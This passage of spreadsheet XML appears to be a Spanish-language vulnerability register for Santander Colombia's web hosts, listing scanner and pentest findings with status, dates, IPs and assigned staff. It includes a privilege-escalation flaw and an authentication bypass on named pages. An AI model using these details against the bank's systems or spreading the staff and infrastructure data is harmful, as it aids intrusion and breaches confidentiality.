para X-XSS-Protections son:_x000a_X-XSS-Protection: 1 - Activa el filtrado XSS (normalmente por defecto en los navegadores). Si se detecta un ataque de cross-site scripting, el navegador sanea la página (elimina las partes no seguras)._x000a_Protección X-XSS: 1; mode=block - Activa el filtrado XSS. En lugar de desinfectar la página, el navegador impedirá la visualización de la página si se detecta un ataque._x000a_X-XSS-Protection: 1; report=URI - Activa el filtrado XSS. Si se detecta un ataque de cross-site scripting, el navegador desinfectará la página e informará de la violación. Esto utiliza la funcionalidad de la directiva CSP report-uri para enviar un informe._x000a_Protección X-XSS: 0 desactiva esta directiva y, por tanto, también se trata como no detectada._x000a_Una directiva válida para X-Content-Type-Options: nosniff_x000a_Una directiva HSTS válida Strict-Transport-Security: max-age=&lt;expire-time&gt;; [; includeSubDomains][; preload]_x000a_"/>
    <s v="CWE-693: Fallo del mecanismo de protección menciona lo siguiente - El producto no utiliza o utiliza incorrectamente un mecanismo de protección que proporciona una defensa suficiente contra los ataques dirigidos contra el producto. Un mecanismo de protección &quot;insuficiente&quot; se produce cuando la aplicación no define ningún mecanismo contra una determinada clase de ataque. Un mecanismo de protección &quot;insuficiente&quot; puede proporcionar algunas defensas -por ejemplo, contra los ataques más comunes- pero no protege contra todo lo que se pretende. Por último, un mecanismo &quot;ignorado&quot; ocurre cuando un mecanismo está disponible y en uso activo dentro del producto, pero el desarrollador no lo ha aplicado en alguna ruta de código._x000a_Se aconseja a los clientes que establezcan las cabeceras de respuesta HTTP X-Frame-Options, X-XSS-Protection, X-Content-Type-Options y Strict-Transport-Security adecuadas._x000a_Dependiendo de su software de servidor, los clientes pueden establecer directivas en la configuración de su sitio o en los archivos Web.config. Algunos ejemplos son_x000a_X-Frame-Options:_x000a_Apache: El encabezado siempre añade X-Frame-Options SAMEORIGIN_x000a_nginx: add_header X-Frame-Options SAMEORIGIN;_x000a_HAProxy: rspadd X-Frame-Options:\ SAMEORIGIN_x000a_IIS: &lt;HTTPPROTOCOL&gt;&lt;CUSTOMHEADERS&gt;&lt;ADD NAME=&quot;X-Frame-Options&quot; VALUE=&quot;SAMEORIGIN&quot;&gt;&lt;/ADD&gt;&lt;/CUSTOMHEADERS&gt;&lt;/HTTPPROTOCOL&gt;_x000a_Protección X-XSS:_x000a_Apache: El encabezado siempre establece X-XSS-Protection &quot;1; mode=block&quot; _x000a_PHP: header(&quot;X-XSS-Protection: 1; mode=block&quot;);_x000a_X-Content-Type-Options:_x000a_Apache: El encabezado siempre se establece X-Content-Type-Options: nosniff_x000a_HTTP Strict-Transport-Security:_x000a_Apache: Header always set Strict-Transport-Security &quot;max-age=31536000; includeSubDomains&quot;_x000a_Nginx: add_header Strict-Transport-Security max-age=31536000;"/>
    <m/>
    <m/>
    <s v="Certificada"/>
    <s v="Jaime Orlando Vargas Martinez"/>
  </r>
  <r>
    <n v="163"/>
    <s v="BSNC"/>
    <s v="Qualys"/>
    <s v="Wep App"/>
    <m/>
    <m/>
    <s v="Supernet"/>
    <s v="QA-WAS-50c866aa-e8b0-41d8-8226-ca5e66d06f41"/>
    <m/>
    <x v="59"/>
    <m/>
    <s v="Solved"/>
    <x v="1"/>
    <m/>
    <m/>
    <m/>
    <s v="www.santander.com.co/Web/Login.aspx?ReturnUrl=%2FWeb%2F"/>
    <m/>
    <m/>
    <d v="2021-04-19T00:00:00"/>
    <n v="1891"/>
    <d v="2021-07-18T00:00:00"/>
    <x v="0"/>
    <m/>
    <m/>
    <m/>
    <d v="2021-09-20T00:00:00"/>
    <s v="Se descubrió un archivo, directorio o listado de directorios potencialmente sensible en el servidor web._x000a__x000a_URL: https://www.santander.com.co/Web/Login.aspx?ReturnUrl=%2fWeb%2fApp_Themes%2fLogin%2fImages%2fcss%2f"/>
    <s v="Compruebe que el acceso a este archivo o directorio está permitido. Si es necesario, elimínelo o aplique controles de acceso a él."/>
    <m/>
    <d v="2021-08-19T00:00:00"/>
    <s v="Certificada"/>
    <s v="Jaime Orlando Vargas Martinez"/>
  </r>
  <r>
    <n v="164"/>
    <s v="BSNC"/>
    <s v="Qualys"/>
    <m/>
    <m/>
    <m/>
    <s v="Confirming &amp; Factoring\Bot"/>
    <s v="QA-WAS-b60f7eb9-3d9e-49ae-9ae1-1652f8e3b10e"/>
    <m/>
    <x v="59"/>
    <m/>
    <s v="Dismissed"/>
    <x v="1"/>
    <m/>
    <m/>
    <m/>
    <s v="confirming-factoring.santander.com.co"/>
    <m/>
    <m/>
    <d v="2021-04-26T00:00:00"/>
    <n v="1884"/>
    <d v="2021-07-25T00:00:00"/>
    <x v="0"/>
    <m/>
    <m/>
    <m/>
    <d v="2021-04-26T00:00:00"/>
    <s v="Se descubrió un archivo, directorio o listado de directorios potencialmente sensible en el servidor web._x000a_URL: https://confirming-factoring.santander.com.co/factoring/error.htm?_event_transid=973165808"/>
    <s v="Compruebe que el acceso a este archivo o directorio está permitido. Si es necesario, elimínelo o aplique controles de acceso a él."/>
    <m/>
    <m/>
    <s v="Falso positivo"/>
    <s v="Jaime Orlando Vargas Martinez"/>
  </r>
  <r>
    <n v="165"/>
    <s v="BSNC"/>
    <s v="BitSight"/>
    <s v="Infraestructura"/>
    <m/>
    <m/>
    <s v="santandersupernet.com.co"/>
    <m/>
    <m/>
    <x v="77"/>
    <m/>
    <s v="Dismissed"/>
    <x v="5"/>
    <m/>
    <m/>
    <m/>
    <s v="santandersupernet.com.co"/>
    <m/>
    <m/>
    <d v="2021-05-21T00:00:00"/>
    <n v="1859"/>
    <d v="2021-09-18T00:00:00"/>
    <x v="0"/>
    <m/>
    <m/>
    <m/>
    <m/>
    <s v="La zona principal no está firmada"/>
    <s v="La zona principal devuelve un registro NSEC o NSEC3 para demostrar que DNSSEC no está configurado en un dominio."/>
    <m/>
    <s v="Sin definir"/>
    <m/>
    <s v="Jorge Arturo Guzman Sanchez"/>
  </r>
  <r>
    <n v="166"/>
    <s v="BSNC"/>
    <s v="BitSight"/>
    <s v="Infraestructura"/>
    <m/>
    <m/>
    <s v="santandersupernet.co"/>
    <m/>
    <m/>
    <x v="77"/>
    <m/>
    <s v="Dismissed"/>
    <x v="5"/>
    <m/>
    <m/>
    <m/>
    <s v="santandersupernet.co"/>
    <m/>
    <m/>
    <d v="2021-05-21T00:00:00"/>
    <n v="1859"/>
    <d v="2021-09-18T00:00:00"/>
    <x v="0"/>
    <m/>
    <m/>
    <m/>
    <m/>
    <s v="DNSSEC no está configurado en este dominio"/>
    <s v="Deberá configurar DNSSEC para su dominio, incluida la generación de claves necesarias y la actualización de registros de zona DNS en consecuencia. Consulte esta guía de DigitalOcean para obtener instrucciones que pueden ser aplicables a la configuración de su servidor, así como dnssec.net para obtener documentos prácticos relacionados con la configuración de DNSSEC."/>
    <m/>
    <s v="Sin definir"/>
    <m/>
    <s v="Jorge Arturo Guzman Sanchez"/>
  </r>
  <r>
    <n v="167"/>
    <s v="BSNC"/>
    <s v="Qualys"/>
    <s v="Wep App"/>
    <m/>
    <m/>
    <s v="Supernet"/>
    <s v="QA-WAS-a5dfc835-19fe-4c40-8e11-f0a102c23129"/>
    <m/>
    <x v="56"/>
    <m/>
    <s v="Dismissed"/>
    <x v="2"/>
    <m/>
    <m/>
    <m/>
    <s v="www.santander.com.co/Web/Login.aspx?ReturnUrl=%2FWeb%2F"/>
    <m/>
    <m/>
    <d v="2021-07-29T00:00:00"/>
    <n v="1790"/>
    <d v="2021-11-26T00:00:00"/>
    <x v="0"/>
    <m/>
    <m/>
    <m/>
    <d v="2022-08-11T00:00:00"/>
    <s v="Los URLs relativos pueden ser peligrosos ya que el navegador puede no determinar el directorio correcto. Si el HTML usa enlaces CSS relacionados con la ruta, puede ser susceptible a vulnerabilidades de importación de hojas de estilo relacionadas con la ruta (PRSSI). Esto podría permitir a un atacante aprovecharse de las importaciones de CSS con URLs relativas sobrescribiendo su archivo de destino._x000a__x000a_App_Themes/Login/Login.css?v=H20150511_1205_x000a_App_Themes/Default/Default.css?v=H20150511_1205_x000a_App_Themes/Common/blockScreen/blockScreen.css?v=H20150615_1800_x000a_App_Themes/Login/Login.css_x000a__x000a_Ruta: https://www.santander.com.co/Web/Login.aspx?ReturnUrl=%2FWeb%2F_x000a__x000a_Referencias:_x000a_Inyección maligna de CSS_x000a_Ataque de sobrescritura de la ruta relativa_x000a_Un trabajo de investigación: Análisis a gran escala de la inyección de estilo por sobreescritura de ruta relativa._x000a_"/>
    <s v="Se recomienda eliminar las URL relativas y utilizar las URL absolutas en las importaciones de CSS._x000a__x000a_Las siguientes alternativas pueden aplicarse para evitar las vulnerabilidades de PRSSI._x000a_- Establecer un DOCTYPE que no permita el modo Quirks como se explica en https://hsivonen.fi/doctype/_x000a_- Establecer el encabezado de respuesta X-Frame-Opciones:deny_x000a_- Ajustar el encabezado de respuesta X-Content-Type-Opciones: nosniff_x000a_- Definir una etiqueta base HTML para especificar la URL base para todas las URLs relativas de un documento."/>
    <m/>
    <s v="1ª Fecha: 19/08/2021_x000a_2ª Fecha: 26/11/2021_x000a_3ª Fecha: 25/01/2021_x000a_4ª Fecha: 04/02/2022_x000a_5ª Fecha: 04/03/2022"/>
    <m/>
    <s v="Jaime Orlando Vargas Martinez"/>
  </r>
  <r>
    <n v="168"/>
    <s v="BSNC"/>
    <s v="Qualys"/>
    <m/>
    <m/>
    <m/>
    <s v="Supernet"/>
    <s v="QA-WAS-cea866e7-ee4f-4501-8c95-86e4b593296b"/>
    <m/>
    <x v="79"/>
    <m/>
    <s v="Dismissed"/>
    <x v="4"/>
    <m/>
    <m/>
    <m/>
    <s v="www.santander.com.co/Web/Login.aspx?ReturnUrl=%2FWeb%2F"/>
    <m/>
    <m/>
    <d v="2021-08-09T00:00:00"/>
    <n v="1779"/>
    <d v="2021-09-08T00:00:00"/>
    <x v="0"/>
    <m/>
    <m/>
    <m/>
    <m/>
    <s v="La vulnerabilidad TLS también se conoce como Retorno de la Amenaza Oracle de Bleichenbacher (ROBOT). ROBOT permite a un atacante obtener la clave RSA necesaria para descifrar el tráfico TLS bajo ciertas condiciones.Para detectar esto los cifradores vulnerables deben ser deshabilitados._x000a_Pasos para deshabilitar los cifrados vulnerables"/>
    <s v="Para ver las actualizaciones, consulte el aviso sobre el robot ROBOT_x000a_Parche:_x000a_A continuación encontrará los enlaces para descargar los parches que corrigen las vulnerabilidades:_x000a_ ROBOT"/>
    <m/>
    <s v="Sin definir"/>
    <s v="Falso positivo"/>
    <s v="Jaime Orlando Vargas Martinez"/>
  </r>
  <r>
    <n v="169"/>
    <s v="BSNC"/>
    <s v="Qualys"/>
    <m/>
    <m/>
    <m/>
    <s v="Web de Proveedores"/>
    <s v="QA-VM--6335931068602527804"/>
    <m/>
    <x v="80"/>
    <m/>
    <s v="Dismissed"/>
    <x v="1"/>
    <m/>
    <m/>
    <s v="170.169.33.48"/>
    <s v="confirming.santander.com.co"/>
    <m/>
    <m/>
    <d v="2021-08-09T00:00:00"/>
    <n v="1779"/>
    <d v="2021-11-07T00:00:00"/>
    <x v="0"/>
    <m/>
    <m/>
    <m/>
    <m/>
    <s v="Se ha detectado una posible interferencia en el escaneo._x000a_Se debe permitir que un escaneo PCI realice un escaneo sin interferencia de sistemas de detección de intrusos o sistemas de prevención de intrusos. _x000a_El ASV de la PCI debe publicar un fallo si se detecta una interferencia en el escaneo. _x000a__x000a_El objetivo de este QID es garantizar que los sistemas de protección activa no bloqueen, filtren, eliminen o modifiquen los paquetes de red de un escaneo certificado PCI, ya que este comportamiento podría afectar a la capacidad de una ASV para detectar vulnerabilidades. Los Sistemas de Protección Activa pueden incluir cualquiera de los siguientes: IPS, WAF, Firewall, NGF, Dispositivo QoS, Filtro de Spam, etc. que están modificando dinámicamente su comportamiento basado en la información recogida de los patrones de tráfico. Este QID se activa si un servicio bien conocido y popular no se identifica correctamente debido a una posible interferencia de escaneo. Se incluyen servicios como FTP, SSH, Telnet, DNS, HTTP y servicios de bases de datos como MSSQL, Oracle, MySql._x000a__x000a_-Si se detecta que un Sistema de Protección Activa impide que se complete el escaneo, los comerciantes deben realizar los cambios necesarios (por ejemplo, una lista blanca) para que el escaneo ASV pueda completarse sin impedimentos._x000a_ _x000a_-Si la exploración no se bloquea activamente, los comerciantes pueden presentar una solicitud de falso positivo/excepción de la PCI con una declaración en la que se afirme que no hay ningún sistema de protección activo presente o que está bloqueando la exploración._x000a__x000a_Además, si no hay riesgo para el entorno de datos del titular de la tarjeta, como por ejemplo que no se esté ejecutando ningún servicio web, esto también puede presentarse como una solicitud de falso positivo/excepción de la PCI y revisarse según el flujo de trabajo estándar de la PCI._x000a__x000a_Para obtener más detalles sobre la interferencia de escaneo durante un escaneo PCI, consulte la sección Interferencia de Escaneo ASV de la Guía del Programa de Proveedores de Escaneo Aprobados de PCI DSS, versión 2.0, mayo de 2013, página 14/28."/>
    <s v="Ponga en la lista blanca el escáner de Qualys para que escanee sin interferencia del IDS o IPS."/>
    <m/>
    <s v="Sin definir"/>
    <m/>
    <m/>
  </r>
  <r>
    <n v="170"/>
    <s v="BSNC"/>
    <s v="Qualys"/>
    <m/>
    <m/>
    <m/>
    <s v="WAF"/>
    <s v="QA-VM-772808486615251865"/>
    <m/>
    <x v="81"/>
    <m/>
    <s v="Dismissed"/>
    <x v="2"/>
    <m/>
    <m/>
    <s v="45.60.195.69"/>
    <m/>
    <m/>
    <m/>
    <d v="2021-08-09T00:00:00"/>
    <n v="1779"/>
    <d v="2021-12-07T00:00:00"/>
    <x v="0"/>
    <m/>
    <m/>
    <m/>
    <d v="2022-08-11T00:00:00"/>
    <s v="El servidor de fuentes X de Windows proporciona tipos de fuentes a los servidores X de la red.  Este programa de software es vulnerable a un ataque de denegación de servicio que puede inutilizar todos los servidores X dependientes."/>
    <s v="Si el servicio no es necesario, entonces debe cerrarlo. De lo contrario, asegúrese de que el servidor de fuentes está correctamente protegido contra el fuego."/>
    <m/>
    <s v="Sin definir"/>
    <m/>
    <m/>
  </r>
  <r>
    <n v="171"/>
    <s v="BSNC"/>
    <s v="Qualys"/>
    <m/>
    <m/>
    <m/>
    <s v="WAF"/>
    <s v="QA-VM--6902507575264806244"/>
    <m/>
    <x v="79"/>
    <m/>
    <s v="Solved"/>
    <x v="4"/>
    <m/>
    <m/>
    <s v="45.60.195.69"/>
    <m/>
    <m/>
    <m/>
    <d v="2021-08-23T00:00:00"/>
    <n v="1765"/>
    <d v="2021-09-22T00:00:00"/>
    <x v="0"/>
    <m/>
    <m/>
    <m/>
    <d v="2021-09-20T00:00:00"/>
    <s v="La vulnerabilidad TLS también se conoce como Retorno de la Amenaza Oracle de Bleichenbacher (ROBOT). ROBOT permite a un atacante obtener la clave RSA necesaria para descifrar el tráfico TLS bajo ciertas condiciones.Para detectar esto los cifradores vulnerables deben ser deshabilitados._x000a_Pasos para deshabilitar los cifrados vulnerables"/>
    <s v="Para ver las actualizaciones, consulte el aviso sobre el robot ROBOT_x000a_Parche:_x000a_A continuación se encuentran los enlaces para descargar los parches que corrigen las vulnerabilidades:_x000a_ ROBOT"/>
    <m/>
    <s v="Sin definir"/>
    <s v="Certificada"/>
    <m/>
  </r>
  <r>
    <n v="172"/>
    <s v="BSNC"/>
    <s v="SecurityScorecard"/>
    <s v="Wep App"/>
    <m/>
    <m/>
    <s v="Portal Web"/>
    <m/>
    <m/>
    <x v="82"/>
    <m/>
    <s v="Solved"/>
    <x v="1"/>
    <m/>
    <m/>
    <m/>
    <s v="www.santander.com.co"/>
    <m/>
    <m/>
    <d v="2021-08-25T00:00:00"/>
    <n v="1763"/>
    <d v="2021-11-23T00:00:00"/>
    <x v="0"/>
    <m/>
    <m/>
    <m/>
    <d v="2021-12-13T00:00:00"/>
    <s v="El sitio HTTP redirige a los usuarios a una nueva URL de una manera que no se puede proteger con los encabezados HTTPS y HSTS. Esto deja a los usuarios abiertos a atacantes de intermediarios que pueden redirigirlos a una versión fraudulenta / falsificada del sitio deseado. Consulte el tipo de problema &quot;El sitio no aplica HTTPS&quot; para obtener más información sobre los escenarios de intermediario._x000a__x000a_En la primera redirección www.santander.com.co (HTTP) no existe la cabecera Strict-Transport-Security, en la segunda santander.com.co (HTTPS) falta el flag “includesubdomains”, este redirige a www.santander.com.co (HTTPS, HSTS y includesubdomains)."/>
    <s v="Cualquier sitio HTTP debe redirigir al usuario a una versión segura (es decir, HTTPS) del mismo dominio que se solicitó originalmente (o una versión de nivel superior / principal de ese mismo dominio). Por ejemplo, http://www.example.com solo debe redirigir a https://www.example.com o https://example.com. Esta redirección debe realizarse antes de redirigir a cualquier otro dominio o subdominio._x000a__x000a_https://www.sentinelstand.com/article/http-strict-transport-security-hsts-canonical-www-redirects"/>
    <s v="El sitio redirige a un dominio de una manera que limita la seguridad proporcionada por los encabezados HTTPS y HTTP Strict Transport Security (HSTS); esto deja a los usuarios vulnerables a ser redirigidos a una versión malintencionada / falsificada del sitio."/>
    <s v="Sin definir"/>
    <s v="Certificada"/>
    <s v="Jaime Orlando Vargas Martinez"/>
  </r>
  <r>
    <n v="173"/>
    <s v="BSNC"/>
    <s v="Qualys"/>
    <m/>
    <m/>
    <m/>
    <s v="Confirming &amp; Factoring\Bot"/>
    <s v="QA-WAS-06bf2433-6277-44bf-b378-8a7ebbf90a6e"/>
    <m/>
    <x v="59"/>
    <m/>
    <s v="Solved"/>
    <x v="1"/>
    <m/>
    <m/>
    <m/>
    <s v="confirming-factoring.santander.com.co"/>
    <m/>
    <m/>
    <d v="2021-09-17T00:00:00"/>
    <n v="1740"/>
    <d v="2021-12-16T00:00:00"/>
    <x v="0"/>
    <m/>
    <m/>
    <m/>
    <d v="2021-09-28T00:00:00"/>
    <s v="Se descubrió un archivo, directorio o listado de directorios potencialmente sensible en el servidor web._x000a__x000a_https://confirming-factoring.santander.com.co/administration/"/>
    <s v="Compruebe que el acceso a este archivo o directorio está permitido. Si es necesario, elimínelo o aplique controles de acceso a él."/>
    <m/>
    <s v="Sin definir"/>
    <s v="Certificada"/>
    <s v="Jaime Orlando Vargas Martinez"/>
  </r>
  <r>
    <n v="174"/>
    <s v="BSNC"/>
    <s v="Qualys"/>
    <m/>
    <m/>
    <m/>
    <s v="Confirming &amp; Factoring\Bot"/>
    <s v="QA-WAS-30efd7c4-1994-4af8-9d3d-bdc918833444"/>
    <m/>
    <x v="83"/>
    <m/>
    <s v="Solved"/>
    <x v="4"/>
    <m/>
    <m/>
    <m/>
    <s v="confirming-factoring.santander.com.co"/>
    <m/>
    <m/>
    <d v="2021-09-28T00:00:00"/>
    <n v="1729"/>
    <d v="2021-10-28T00:00:00"/>
    <x v="0"/>
    <m/>
    <m/>
    <m/>
    <d v="2021-11-19T00:00:00"/>
    <s v="La mayoría de los servidores DNS incluyen registros de la forma_x000a__x000a_localhost. IN A 127.0.0.1_x000a__x000a_Pero si por error, el administrador omite el punto final, el registro no está completamente cualificado. Así que si el dominio es ejemplo.com, las consultas para localhost.ejemplo.com se resolverían a 127.0.0.1._x000a__x000a_Referencia:_x000a_https://seclists.org/bugtraq/2008/Jan/270"/>
    <s v="Las entradas no cualificadas de localhost no deben estar presentes en el servidor de nombres para los dominios que alojan sitios web con gestión de estado HTTP (cookies)."/>
    <s v="No se puede acceder de forma segura a los sitios web del dominio afectado en un sistema multiusuario. El atacante puede engañar a otro usuario en el mismo sistema para que acceda a sitios web en el dominio afectado de tal manera que resulte en cookies con fugas de secuencias de comandos entre sitios."/>
    <d v="2021-11-19T00:00:00"/>
    <m/>
    <s v="Jaime Orlando Vargas Martinez"/>
  </r>
  <r>
    <n v="175"/>
    <s v="BSNC"/>
    <s v="Qualys"/>
    <m/>
    <m/>
    <m/>
    <s v="Portal Web"/>
    <s v="QA-WAS-3d19af4d-370a-45a2-9019-7932cdaec645"/>
    <m/>
    <x v="83"/>
    <m/>
    <s v="Solved"/>
    <x v="4"/>
    <m/>
    <m/>
    <m/>
    <s v="www.santander.com.co"/>
    <m/>
    <m/>
    <d v="2021-09-20T00:00:00"/>
    <n v="1737"/>
    <d v="2021-10-20T00:00:00"/>
    <x v="0"/>
    <m/>
    <m/>
    <m/>
    <d v="2021-11-19T00:00:00"/>
    <s v="La mayoría de los servidores DNS incluyen registros de la forma_x000a__x000a_localhost. IN A 127.0.0.1_x000a__x000a_Pero si por error, el administrador omite el punto final, el registro no está completamente cualificado. Así que si el dominio es ejemplo.com, las consultas para localhost.ejemplo.com se resolverían a 127.0.0.1._x000a__x000a_Referencia:_x000a_https://seclists.org/bugtraq/2008/Jan/270"/>
    <s v="Las entradas no cualificadas de localhost no deben estar presentes en el servidor de nombres para los dominios que alojan sitios web con gestión de estado HTTP (cookies)."/>
    <s v="No se puede acceder de forma segura a los sitios web del dominio afectado en un sistema multiusuario. El atacante puede engañar a otro usuario en el mismo sistema para que acceda a sitios web en el dominio afectado de tal manera que resulte en cookies con fugas de secuencias de comandos entre sitios."/>
    <d v="2021-11-19T00:00:00"/>
    <m/>
    <s v="Jaime Orlando Vargas Martinez"/>
  </r>
  <r>
    <n v="176"/>
    <s v="BSNC"/>
    <s v="Synack"/>
    <m/>
    <m/>
    <m/>
    <s v="Supernet"/>
    <s v="helicopterantgrub-1"/>
    <m/>
    <x v="84"/>
    <m/>
    <s v="Solved"/>
    <x v="4"/>
    <n v="8.1"/>
    <m/>
    <m/>
    <s v="www.santander.com.co/Web/Login.aspx?ReturnUrl=%2FWeb%2F"/>
    <m/>
    <m/>
    <d v="2021-10-04T00:00:00"/>
    <n v="1723"/>
    <d v="2021-11-03T00:00:00"/>
    <x v="0"/>
    <m/>
    <m/>
    <m/>
    <d v="2022-08-01T00:00:00"/>
    <s v="El control de acceso, a veces llamado autorización, es la forma en que las aplicaciones conceden acceso a contenidos y funciones a algunos usuarios y no a otros. Implementar un control de acceso sólido y seguro suele ser un reto, ya que los usuarios pueden pertenecer a varios grupos o roles con diferentes habilidades o privilegios._x000a__x000a_Existen vulnerabilidades de control de acceso rotas cuando un usuario puede de hecho acceder a algún recurso o realizar alguna acción a la que se supone que no puede acceder._x000a__x000a_https://www.santander.com.co/Web/Pages/Requests/PersonalInformationChangeRequest.aspx"/>
    <s v="Revise cada uno de los campos de los formularios a los que los usuarios acceden o envían datos y asegúrese de que las comprobaciones de autorización del lado del servidor son obligatorias."/>
    <s v="Un usuario estándar puede elevar sus privilegios a un usuario Administrador. Con este nivel de acceso pueden ver y modificar otros usuarios del sistema, así como alterar los permisos de productos y páginas._x000a__x000a_Al modificar los tokens de seguridad y las contraseñas de los usuarios existentes, el atacante también puede hacerse con el control de otras cuentas."/>
    <s v="1ª Fecha: 19/08/2021_x000a_2ª Fecha: 26/11/2021_x000a_3ª Fecha: 25/01/2021_x000a_4ª Fecha: 04/02/2022_x000a_5ª Fecha: 04/03/2022_x000a_6ª Fecha: 06/05/2022"/>
    <s v="Certificada"/>
    <s v="Jaime Orlando Vargas Martinez"/>
  </r>
  <r>
    <n v="177"/>
    <s v="BSNC"/>
    <s v="Synack"/>
    <m/>
    <m/>
    <m/>
    <s v="Supernet"/>
    <s v="helicopterantgrub-2"/>
    <m/>
    <x v="85"/>
    <m/>
    <s v="Dismissed"/>
    <x v="1"/>
    <n v="5.4"/>
    <m/>
    <m/>
    <s v="www.santander.com.co/Web/Login.aspx?ReturnUrl=%2FWeb%2F"/>
    <m/>
    <m/>
    <d v="2021-10-04T00:00:00"/>
    <n v="1723"/>
    <d v="2022-01-02T00:00:00"/>
    <x v="0"/>
    <m/>
    <m/>
    <m/>
    <d v="2022-08-11T00:00:00"/>
    <s v="La autenticación escalonada es el proceso por el cual se reta a un usuario a presentar formas adicionales de autenticación para proporcionar un mayor nivel de garantía de que es realmente quien dice ser. La autenticación escalonada se implementa normalmente como parte de un esquema de autenticación adaptable que busca igualar el nivel de riesgo de la solicitud con el nivel de garantía de la autenticación._x000a__x000a_https://www.santander.com.co/Web/Pages/Requests/PersonalInformationChangeRequest.aspx"/>
    <s v="Asegúrese de que la aplicación está rastreando correctamente la sesión del usuario y sólo proporciona acceso a las páginas sensibles una vez que la autenticación por pasos se ha completado con éxito."/>
    <s v="El bypass permite a los usuarios ver y editar los detalles del perfil que están protegidos por una contraseña secundaria escalonada sin el conocimiento de dicha contraseña."/>
    <s v="1ª Fecha: 19/08/2021_x000a_2ª Fecha: 26/11/2021_x000a_3ª Fecha: 25/01/2021_x000a_4ª Fecha: 04/02/2022_x000a_5ª Fecha: 04/03/2022"/>
    <m/>
    <s v="Jaime Orlando Vargas Martinez"/>
  </r>
  <r>
    <n v="178"/>
    <s v="BSNC"/>
    <s v="BitSight"/>
    <s v="Wep App"/>
    <m/>
    <m/>
    <s v="Confirming &amp; Factoring\Bot"/>
    <m/>
    <m/>
    <x v="86"/>
    <m/>
    <s v="Active"/>
    <x v="5"/>
    <m/>
    <m/>
    <m/>
    <s v="confirming-factoring.santander.com.co"/>
    <m/>
    <m/>
    <d v="2022-11-12T00:00:00"/>
    <n v="1319"/>
    <d v="2023-03-12T00:00:00"/>
    <x v="0"/>
    <m/>
    <m/>
    <m/>
    <m/>
    <s v="Esta Política de seguridad de contenido (CSP) tiene problemas que posiblemente la hagan insegura._x000a__x000a_Content-Security-Policy: script-src 'self' 'unsafe-inline' 'unsafe-eval' ; object-src 'self'; form-action 'self'; connect-src 'self'; plugin-types application/pdf application/x-shockwave-flash; frame-src 'self'; frame-ancestors 'self'_x000a__x000a_script-src: &quot;Unsafe-eval&quot; es inseguro , &quot;Unsafe-inline&quot; es inseguro_x000a_reporting-objective: Sin directiva de informes en uso_x000a_code-injection-objective: Prevención de inyección de código limitado_x000a_default-src: Falta default-src"/>
    <s v="Elimine cualquier instancia de directivas “inseguras” y fuentes de “blob, datos, sistema de archivos”. Asegúrese de que sus directivas CSP estén configuradas correctamente._x000a__x000a_Asegúrese de que sus encabezados estén implementados correctamente, como se describe en RFC-7231 . Sus encabezados no deberían permitir el almacenamiento en caché de contenido cifrado. También deben tener permisos específicos (en lugar de usar comodines u otras generalizaciones) y tener el formato adecuado._x000a__x000a_script-src: Elimine la palabra clave &quot;unsafe-eval&quot; de su política de seguridad de contenido._x000a_Elimine la palabra clave &quot;inseguro en línea&quot; de su política de seguridad de contenido._x000a_reporting-objective: Incluya una directiva de informes con una ubicación o grupo válido._x000a_code-injection-objective: No utilice ninguna palabra clave &quot;insegura&quot; y utilice hosts explícitos para las directivas de la lista de fuentes._x000a_default-src: Utilice la directiva default-src en su Política de seguridad de contenido (CSP)_x000a_"/>
    <m/>
    <s v="1° Fecha: 24/02/2024_x000a_2° Fecha: 07/08/2024"/>
    <s v="Revisar con BOT la implementación, se debe realizar en la instancia web"/>
    <s v="Jaime Orlando Vargas Martinez"/>
  </r>
  <r>
    <n v="179"/>
    <s v="BSNC"/>
    <s v="SecurityScorecard"/>
    <s v="Infraestructura"/>
    <m/>
    <m/>
    <s v="Portal Web"/>
    <m/>
    <m/>
    <x v="87"/>
    <m/>
    <s v="Solved"/>
    <x v="1"/>
    <m/>
    <m/>
    <s v="170.169.33.93"/>
    <s v="www.santander.com.co"/>
    <m/>
    <m/>
    <d v="2021-11-05T00:00:00"/>
    <n v="1691"/>
    <d v="2022-02-03T00:00:00"/>
    <x v="0"/>
    <m/>
    <m/>
    <m/>
    <d v="2021-12-17T00:00:00"/>
    <s v="Cuando una Autoridad de Certificación (CA) emite un certificado, incluye dos fechas: la fecha en la que el certificado empieza a ser válido y la fecha en la que deja de serlo. Si un cliente TLS (por ejemplo, un navegador web) se conecta a un servidor TLS (por ejemplo, un sitio web) y recibe un certificado caducado, el cliente TLS rechazará la conexión._x000a_Los certificados son activos digitales que requieren ser renovados o dados de baja según un calendario._x000a__x000a_https://tools.ietf.org/html/rfc5280#section-4.1.2.5"/>
    <s v="Los certificados caducados impiden a los clientes TLS conectarse a los servidores."/>
    <s v="Los servicios que presentan certificados caducados deberían causar fallos notables, así que confirme que el servicio sigue en uso. Si el servicio no está en uso, desactívelo. De lo contrario, póngase en contacto con la CA y gestione la emisión de un nuevo certificado._x000a_Evalúe la política de gestión de certificados de la organización para asegurarse de que los certificados se renuevan o retiran antes de su fecha de caducidad."/>
    <s v="Sin definir"/>
    <s v="Certificada"/>
    <s v="Jaime Orlando Vargas Martinez"/>
  </r>
  <r>
    <n v="180"/>
    <s v="BSNC"/>
    <s v="Qualys"/>
    <m/>
    <m/>
    <m/>
    <s v="Portal Web"/>
    <s v="QA-VM-843457312377902410"/>
    <m/>
    <x v="79"/>
    <m/>
    <s v="Solved"/>
    <x v="4"/>
    <n v="7.4"/>
    <m/>
    <m/>
    <s v="www.santander.com.co"/>
    <m/>
    <m/>
    <d v="2021-12-23T00:00:00"/>
    <n v="1643"/>
    <d v="2022-01-22T00:00:00"/>
    <x v="0"/>
    <m/>
    <m/>
    <m/>
    <d v="2021-12-18T00:00:00"/>
    <s v="La vulnerabilidad TLS también se conoce como Retorno de la Amenaza Oracle de Bleichenbacher (ROBOT). ROBOT permite a un atacante obtener la clave RSA necesaria para descifrar el tráfico TLS bajo ciertas condiciones.Para detectar esto los cifradores vulnerables deben ser deshabilitados._x000a_Pasos para deshabilitar los cifrados vulnerables"/>
    <s v="Para ver las actualizaciones, consulte el aviso sobre el robot ROBOT_x000a_Parche:_x000a_A continuación se encuentran los enlaces para descargar los parches que corrigen las vulnerabilidades:_x000a_ ROBOT"/>
    <m/>
    <s v="Sin definir"/>
    <m/>
    <s v="Jaime Orlando Vargas Martinez"/>
  </r>
  <r>
    <n v="181"/>
    <s v="BSNC"/>
    <s v="Qualys"/>
    <m/>
    <m/>
    <m/>
    <s v="Portal Web"/>
    <s v="QA-VM-5119251316125648481"/>
    <m/>
    <x v="88"/>
    <m/>
    <s v="Dismissed"/>
    <x v="1"/>
    <n v="5.9"/>
    <s v="CVE-2019-1559"/>
    <m/>
